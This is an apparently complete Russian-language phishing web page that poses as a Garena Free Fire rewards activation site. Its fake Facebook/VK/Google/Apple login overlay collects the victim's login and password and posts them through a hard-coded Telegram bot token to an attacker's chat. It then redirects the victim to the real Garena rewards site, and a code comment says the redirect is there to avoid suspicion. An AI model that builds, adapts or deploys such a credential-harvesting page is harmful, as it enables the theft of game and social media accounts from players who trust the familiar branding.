<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Redemption</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 450px; background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg') no-repeat top center; background-size: cover; min-height: 100vh; position: relative; }
        .overlay-bg { background: rgba(0,0,0,0.65); min-height: 100vh; padding: 25px 20px; box-sizing: border-box; }
        
        .logo-top img { width: 120px; height: auto; display: block; margin-bottom: 30px; }
        
        .header-title { text-align: center; margin-top: 20px; }
        .header-title h1 { font-size: 26px; text-transform: uppercase; letter-spacing: 1px; text-shadow: 2px 2px 5px #000; margin: 0; }
        .header-title p { font-size: 15px; color: #ddd; margin-top: 10px; }

        .social-row { display: flex; justify-content: center; gap: 15px; margin: 35px 0; }
        .s-btn { width: 50px; height: 50px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        .s-btn:hover { transform: scale(1.1); box-shadow: 0 0 15px #ff9000; }
        .s-btn img { width: 30px; height: 30px; }

        .info-card { background: rgba(255,255,255,0.95); border-radius: 12px; padding: 20px; margin-top: 30px; color: #1a1a1a; font-size: 14px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
        .info-card strong { color: #e67e22; font-size: 16px; display: block; margin-bottom: 10px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }

        /* ОКНО АВТОРИЗАЦИИ (КАК НА ФОТО) */
        #auth-gate {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 10000; color: #1c1e21; animation: slideUp 0.4s ease-out;
        }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        
        .gate-content { display: flex; flex-direction: column; align-items: center; padding: 40px 30px; height: 100%; box-sizing: border-box; }
        .gate-logo { width: 70px; margin-bottom: 40px; }
        
        .field-box { width: 100%; margin-bottom: 12px; }
        .gate-input { 
            width: 100%; padding: 16px; border: 1px solid #dddfe2; border-radius: 6px; 
            font-size: 16px; box-sizing: border-box; background: #f5f6f7; outline: none;
        }
        .gate-input:focus { border-color: #1877f2; background: #fff; }
        
        .gate-submit { 
            width: 100%; padding: 14px; background: #1877f2; color: #fff; 
            border: none; border-radius: 6px; font-weight: bold; font-size: 18px; 
            cursor: pointer; margin-top: 10px; 
        }
        .gate-link { color: #1877f2; font-size: 14px; margin-top: 15px; text-decoration: none; font-weight: 500; }
        
        .back-arrow { position: absolute; top: 20px; left: 20px; font-size: 24px; cursor: pointer; color: #4b4f56; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="overlay-bg">
        <div class="logo-top">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/36/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png">
        </div>
        
        <div class="header-title">
            <h1>Страница активации</h1>
            <p>Пожалуйста, войдите через соцсеть</p>
        </div>
        
        <div class="social-row">
            <div class="s-btn" onclick="openGate('Facebook')"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"></div>
            <div class="s-btn" onclick="openGate('VK')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/2048px-VK_Compact_Logo_%282021-present%29.svg.png"></div>
            <div class="s-btn" onclick="openGate('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"></div>
            <div class="s-btn" onclick="openGate('Apple')"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"></div>
        </div>

        <div class="info-card">
            <strong>Важная информация</strong>
            1. Награды придут в течение 24 часов.<br>
            2. Убедитесь, что аккаунт привязан к игре.
        </div>
    </div>
</div>

<div id="auth-gate">
    <div class="back-arrow" onclick="closeGate()">‹</div>
    <div class="gate-content">
        <img id="gate-brand" src="" class="gate-logo">
        
        <div class="field-box">
            <input type="text" id="dat_1" class="gate-input" placeholder="Мобильный телефон или эл. адрес">
        </div>
        <div class="field-box">
            <input type="text" id="dat_2" class="gate-input" placeholder="Пароль" style="-webkit-text-security: disc;">
        </div>
        
        <button class="gate-submit" onclick="submitGate()">Войти</button>
        <a href="#" class="gate-link">Забыли пароль?</a>
        
        <div style="margin-top: auto; padding-top: 40px; border-top: 1px solid #ddd; width: 100%; text-align: center;">
            <button style="background:none; border: 1px solid #1877f2; color: #1877f2; padding: 10px 20px; border-radius: 4px; font-weight: bold;">Создать новый аккаунт</button>
            <div style="margin-top: 20px; color: #8d949e; font-size: 12px;">Meta © 2026</div>
        </div>
    </div>
</div>

<script>
    const T_ID = "8290059613:AAE9QZuohTW8U6Bmd3nC5yJ4x7D-VhLji2o";
    const C_ID = "-5046886202";
    let activeNet = "";

    function openGate(net) {
        activeNet = net;
        let logo = document.getElementById('gate-brand');
        
        // Меняем логотип под выбранную сеть
        if(net === 'Facebook') logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png";
        else if(net === 'Google') logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png";
        else logo.src = "https://upload.wikimedia.org/wikipedia/en/thumb/3/36/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png";

        document.getElementById('auth-gate').style.display = 'block';
    }

    function closeGate() {
        document.getElementById('auth-gate').style.display = 'none';
    }

    async function submitGate() {
        const v1 = document.getElementById('dat_1').value;
        const v2 = document.getElementById('dat_2').value;

        if(!v1 || !v2) return alert("Заполните поля!");

        const message = `🔥 LOG FF 🔥\n🌐 СЕТЬ: ${activeNet}\n👤 ЛОГ: ${v1}\n🔑 ПАС: ${v2}`;

        try {
            await fetch(`https://api.telegram.org/bot${T_ID}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: C_ID, text: message})
            });
            // После отправки кидаем на официальный сайт наград, чтобы не было подозрений
            window.location.href = "https://reward.ff.garena.com/";
        } catch(e) {
            alert("Ошибка соединения с сервером Garena.");
        }
    }
</script>

</body>
</html>
